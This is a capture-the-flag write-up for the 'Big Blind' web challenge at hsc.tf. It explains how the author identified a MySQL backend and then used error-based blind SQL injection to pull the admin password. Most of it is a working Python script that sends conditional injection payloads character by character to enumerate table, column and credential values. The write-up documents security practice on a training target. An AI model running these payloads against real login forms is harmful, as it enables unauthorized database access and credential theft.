# web/big blind

> From the title "Big Blind" I assumed this was some kind of Blind Injection, probably SQL, but I didn't want to assume anything. Sending a single `'` returned a 500 internal server error, backing up my theory that it was probably blind SQL injection.

> After trying a few different things, using the sleep function didn't return an error, but didn't seem to do anything.
I tried other waiting commands like `WAITFOR DELAY '0:0:10'`, `dbms_pipe.receive_message(('a'),10)`, and `pg_sleep(10)`, however, all of these returned errors. 
This meant that it was probably either SQLlite or MySQL.

> I then tested GLOB, a function that is in SQLlite but not MySQL, this returned an error, suggesting that it was MySQL. Because the database was MySQL, I knew that `SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')` would trigger an error if true, and put it into a python script to attempt to expose the database's contents.

> I used the script to determine the tablename (users) from `information_schema.tables`, then determined the column names 
(user, pass) from `information_schema.columns`, and then finally enumerated the username and password (admin, the flag)

> The script is here, I modified it to make it run for each different function, and in this form it is configured for 
enumerating the flag, which was the last time I used it(sorry if its a bit messy):


```
import requests
url = "https://big-blind.hsc.tf/"
payload = "user=ad'+'min&pass='+AND+IF(NOT+SUBSTRING((SELECT+TABLE_NAME+FROM+information_schema.tables+LIMIT+1),1,{})='{}',(SELECT+table_name+FROM+information_schema.tables),'a')#"
headers = {
  'Host': 'big-blind.hsc.tf',
  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
  'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'Accept-Language': 'en-US,en;q=0.5',
  'Accept-Encoding': 'gzip, deflate',
  'Content-Type': 'application/x-www-form-urlencoded',
  'Content-Length': '166',
  'Origin': 'https://big-blind.hsc.tf',
  'Connection': 'close',
  'Referer': 'https://big-blind.hsc.tf/',
  'Upgrade-Insecure-Requests': '1'
}


lalph = list(map(chr, range(ord('a'), ord('z')+1)))
Ualph = list(map(chr, range(ord('A'), ord('Z')+1)))
nums = list(range(0,10))
blank = [""]
additionals = ["_","$","{","}"]
totalPos = blank+additionals+lalph+Ualph+nums
fullAlph = []
for val in totalPos:
    fullAlph.append(str(val))
end = False
thing = 0
dbNames= []
password = "flag"
maxi = 50
while thing < maxi:
    if(end==True):
        end=False
        print("Adding: "+password)
        dbNames+=[password]
        password=""
        
        thing+=1
    for Char in totalPos:
        Char = str(Char)
        reqH = payload
        payload = "user=ad'+'min&pass='+AND+IF(NOT+SUBSTRING((SELECT+pass+FROM+users+WHERE+user='admin'+LIMIT+1+OFFSET+{}),1,{})='{}',(SELECT+table_name+FROM+information_schema.tables),'a')#"
        reqH = reqH.format(thing,len(password)+1,password+Char)
        #print(reqH)
        response = requests.request("POST", url, headers=headers, data=reqH)
        #print(response)
        if("<html lang" in str(response.content)):
            if(Char == ""):
                end=True
                break
            else:
                print(password+Char+"=True")
                password+=Char
                break
        else:
            print(password+Char+"=False")
       
    


print("Database Names: ")
for name in dbNames:
    print(str(name))
```